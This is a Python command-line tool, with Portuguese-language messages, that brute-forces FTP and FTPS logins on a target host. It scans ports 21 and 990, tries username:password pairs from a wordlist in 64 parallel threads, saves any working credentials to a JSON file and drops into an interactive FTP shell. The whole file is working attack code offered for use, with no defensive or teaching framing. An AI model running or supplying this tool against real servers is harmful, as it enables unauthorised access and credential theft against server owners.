import os
import ftplib
import ssl
import argparse
import threading
import socket
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from ftp_shell import FTPShell
from time import sleep

found_event = threading.Event()

SUCCESS_LOG_FILE = "ftp_success_log.json"

os.system("clear")
print("""\033[1;31m
 _____ _       _____         _       
|   __| |_ ___| __  |___ _ _| |_ ___ 
|   __|  _| . | __ -|  _| | |  _| -_|
|__|  |_| |  _|_____|_| |___|_| |___|
          |_|\033[m \033[32mInstagram:\033[m @nanoxsec
""")

def save_success(host, port, user, password, use_ftps):
    data = {
        "host": host,
        "port": port,
        "username": user,
        "password": password,
        "protocol": "FTPS" if use_ftps else "FTP"
    }
    try:
        if os.path.exists(SUCCESS_LOG_FILE):
            with open(SUCCESS_LOG_FILE, "r") as f:
                logs = json.load(f)
        else:
            logs = []

        if data not in logs:
            logs.append(data)
            with open(SUCCESS_LOG_FILE, "w") as f:
                json.dump(logs, f, indent=4)
    except Exception as e:
        print(f"[!] Erro ao salvar log: {e}")

def is_port_open(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def try_connect(host, port, user, password, use_ftps=False):
    if found_event.is_set():
        return False

    try:
        if use_ftps:
            ftps = ftplib.FTP_TLS()
            ftps.connect(host, port, timeout=5)
            ftps.login(user=user, passwd=password)
            ftps.prot_p()
            if not found_event.is_set():
                print("\033[1;32m[+] SUCESSO\033[m!\n")
                print(f"\033[1;32m[*] Username: {user}")
                print(f"\033[1;32m[*] Password: {password}")
                found_event.set()
                save_success(host, port, user, password, use_ftps)
                print("\033[1;32m[*] Iniciando a shell...\033[m")
                sleep(0.2)
                FTPShell(host, user, password, port, use_ftps=True).conectar()
                return True
        else:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user=user, passwd=password)
            if not found_event.is_set():
                print("\033[1;32m[+] SUCESSO\033[m!\n")
                print(f"\033[1;32m[*] Username: {user}")
                print(f"\033[1;32m[*] Password: {password}")
                found_event.set()
                save_success(host, port, user, password, use_ftps)
                print("\033[1;32m[*] Iniciando a shell...\033[m")
                sleep(0.2)
                FTPShell(host, user, password, port, use_ftps=False).conectar()
                return True
    except Exception:
        if not found_event.is_set():
            print(f"\033[1;31m[-]\033[m trying with... {user} : {password} [ \033[1;31mERROR\033[m ]")
    return False

def brute_force(host, port, combo_file, use_ftps=False, max_threads=64):
    with open(combo_file, "r") as f:
        combos = [line.strip() for line in f if ":" in line]

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for combo in combos:
            if found_event.is_set():
                break
            user, password = combo.split(":", 1)
            futures.append(executor.submit(try_connect, host, port, user, password, use_ftps))

        for future in as_completed(futures):
            if found_event.is_set():
                break

def main():
    parser = argparse.ArgumentParser(description="Scanner FTP/FTPS com brute force e shell interativa")
    parser.add_argument("host", help="Endereço IP ou hostname do alvo")
    parser.add_argument("-W", "--wordlist", required=True, help="Wordlist no formato usuario:senha")
    args = parser.parse_args()

    host = args.host
    wordlist = args.wordlist

    print(f"[*] Escaneando {host}...")

    if is_port_open(host, 21):
        print("[*] Porta 21 (FTP) aberta. Iniciando brute force...")
        brute_force(host, 21, wordlist, use_ftps=False)
    elif is_port_open(host, 990):
        print("[*] Porta 990 (FTPS) aberta. Iniciando brute force...")
        brute_force(host, 990, wordlist, use_ftps=True)
    else:
        print("[!] Nenhuma porta de FTP/FTPS encontrada aberta.")

if __name__ == "__main__":
    main()
